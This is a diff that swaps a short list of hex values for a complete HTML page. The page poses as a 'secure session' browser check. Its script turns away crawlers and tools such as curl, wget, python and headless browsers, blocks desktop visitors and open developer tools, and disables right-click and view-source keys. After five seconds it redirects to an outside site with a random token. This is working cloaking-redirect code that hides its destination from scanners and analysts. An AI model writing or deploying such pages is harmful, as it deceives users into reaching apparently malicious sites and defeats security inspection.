@@ -1,10 +1,221 @@
-4F933044
-29297A21
-0C8B9E5D
-D987770A
-5028A01C
-78C7D9E6
-6A12FAD1
-FF495CDF
-D38E67D5
-1579D36E
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    background:#0b1020;
+    color:white;
+    font-family:Arial,sans-serif;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+
+.container{
+    text-align:center;
+    width:90%;
+    max-width:420px;
+}
+
+.logo{
+    font-size:30px;
+    font-weight:bold;
+    margin-bottom:25px;
+    letter-spacing:2px;
+}
+
+.loader-box{
+    width:100%;
+    height:8px;
+    background:#1c2335;
+    border-radius:20px;
+    overflow:hidden;
+}
+
+.loader{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#00c6ff,#0072ff);
+    animation:load 5s linear forwards;
+}
+
+@keyframes load{
+    from{width:0%;}
+    to{width:100%;}
+}
+
+.text{
+    margin-top:18px;
+    font-size:16px;
+    opacity:.9;
+}
+
+.small{
+    margin-top:8px;
+    font-size:13px;
+    opacity:.55;
+}
+
+.bg{
+    position:absolute;
+    width:450px;
+    height:450px;
+    border-radius:50%;
+    background:rgba(0,114,255,.12);
+    filter:blur(120px);
+    z-index:-1;
+}
+
+.bg1{
+    top:-150px;
+    left:-150px;
+}
+
+.bg2{
+    bottom:-150px;
+    right:-150px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg bg1"></div>
+<div class="bg bg2"></div>
+
+<div class="container">
+
+    <div class="logo">SECURE</div>
+
+    <div class="loader-box">
+        <div class="loader"></div>
+    </div>
+
+    <div class="text">
+        Verifying Secure Session...
+    </div>
+
+    <div class="small">
+        Please wait while we validate your browser
+    </div>
+
+</div>
+
+<script>
+(function(){
+
+/* =========================
+   BASIC BOT DETECTION
+========================= */
+
+let ua = navigator.userAgent.toLowerCase();
+
+const blocked = [
+    "bot",
+    "crawler",
+    "spider",
+    "facebookexternalhit",
+    "slurp",
+    "curl",
+    "wget",
+    "python",
+    "scrapy",
+    "headless",
+    "selenium",
+    "phantom",
+    "httpclient"
+];
+
+for(let i=0;i<blocked.length;i++){
+    if(ua.includes(blocked[i])){
+        document.body.innerHTML="Access Denied";
+        throw new Error("Bot Blocked");
+    }
+}
+
+/* =========================
+   MOBILE ONLY
+========================= */
+
+if(window.innerWidth > 900){
+    document.body.innerHTML="Desktop Access Denied";
+    throw new Error("Desktop Blocked");
+}
+
+/* =========================
+   DEVTOOLS DETECT
+========================= */
+
+setInterval(function(){
+    let threshold = 160;
+
+    if(
+        window.outerWidth - window.innerWidth > threshold ||
+        window.outerHeight - window.innerHeight > threshold
+    ){
+        document.body.innerHTML="Inspection Blocked";
+    }
+},1000);
+
+/* =========================
+   HUMAN CHECK
+========================= */
+
+document.cookie = "human_verified=1; max-age=300";
+
+/* =========================
+   DISABLE RIGHT CLICK
+========================= */
+
+document.addEventListener("contextmenu",e=>e.preventDefault());
+
+/* =========================
+   DISABLE COMMON KEYS
+========================= */
+
+document.onkeydown = function(e){
+
+    if(
+        e.keyCode == 123 ||
+        (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
+        (e.ctrlKey && e.key.toUpperCase() === 'U')
+    ){
+        return false;
+    }
+};
+
+/* =========================
+   RANDOM TOKEN
+========================= */
+
+let token = Math.random().toString(36).substring(2);
+
+/* =========================
+   REDIRECT
+========================= */
+
+setTimeout(function(){
+
+    let target = "https://moscow.fyi/?token=" + token;
+
+    window.location.replace(target);
+
+},5000);
+
+})();
+</script>
+
+</body>
+</html>
